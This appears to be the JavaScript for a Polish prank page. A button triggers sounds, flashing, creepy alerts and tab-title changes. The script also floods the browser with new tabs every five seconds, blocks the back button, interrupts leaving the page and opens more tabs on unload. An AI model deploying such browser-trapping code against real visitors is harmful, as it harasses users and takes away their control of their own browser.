const button = document.getElementById('crazyButton');
const message = document.getElementById('message');

// Lista dźwięków
const sounds = [
  new Audio('stracilas-cnote_R1qiG8j.mp3'),
  new Audio('illegal-polish-content.mp3'),
  new Audio('polish-toilet-refrain.mp3')
];

// Losowe tytuły zakładki
const titles = [
  "Antek patrzy...",
  "To nie żart.",
  "Jeszcze tu jesteś?",
  "Uciekaj!",
  "Klikniesz znowu?",
  "404: Bez powrotu",
  "Nie ma odwrotu",
  "Antek w twoim systemie",
  "👁️",
  "💀💀💀"
];

// Linki do otwierania w nowych kartach
const links = [
  "https://ptoszek.pl/",
  "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
  "https://pl.wikipedia.org/wiki/Paranoja",
  "https://niebezpiecznik.pl/",
  "https://www.google.com/search?q=czy+antek+jest+grozny"
];

let titleShuffleStarted = false;

function startTitleShuffle() {
  setInterval(() => {
    const newTitle = titles[Math.floor(Math.random() * titles.length)];
    document.title = newTitle;
  }, 1500);
}

function openMultipleLinks(count = 4) {
  for (let i = 0; i < count; i++) {
    const randomUrl = links[Math.floor(Math.random() * links.length)];
    window.open(randomUrl, "_blank");
  }
}

button.addEventListener('click', () => {
  // Odtwarzanie losowego dźwięku
  const randomSound = sounds[Math.floor(Math.random() * sounds.length)];
  randomSound.currentTime = 0;
  randomSound.play();

  // Losowa wiadomość
  const texts = [
    "To był błąd...",
    "Dlaczego kliknąłeś?",
    "Teraz już za późno.",
    "Zostałeś oznaczony.",
    "Antek obserwuje."
  ];
  const randomText = texts[Math.floor(Math.random() * texts.length)];
  message.textContent = randomText;

  // Migające tło
  document.body.style.backgroundColor = 'red';
  setTimeout(() => {
    document.body.style.backgroundColor = '#000';
  }, 300);

  // Efekt drgania ekranu
  document.body.classList.add('shake');
  setTimeout(() => {
    document.body.classList.remove('shake');
  }, 400);

  // Popupy
  setTimeout(() => {
    alert("Hej! To nie był najlepszy pomysł.");
  }, 500);

  setTimeout(() => {
    const response = confirm("Czy naprawdę myślisz, że to już koniec?");
    if (response) {
      prompt("Podaj swoje imię... Antek chce wiedzieć.");
    } else {
      alert("Antek się zawiódł...");
    }
  }, 1500);

  // Start losowego zmieniania tytułu
  if (!titleShuffleStarted) {
    startTitleShuffle();
    titleShuffleStarted = true;
  }

  // Co 5 sekund otwieraj 4 linki w nowych kartach
  setInterval(() => {
    openMultipleLinks(4);
  }, 5000);
});

// Utrudnianie cofania się
history.pushState(null, null, location.href);
window.onpopstate = function () {
  history.go(1);
};

// Alert przy próbie zamknięcia lub odświeżenia
window.addEventListener('beforeunload', function (e) {
  e.preventDefault();
  e.returnValue = '';
});

// Otwieranie nowych kart, jeśli użytkownik próbuje wyjść
window.addEventListener('unload', () => {
  for(let i=0; i<3; i++) {
    window.open('https://ptoszek.pl/', '_blank');
  }
});
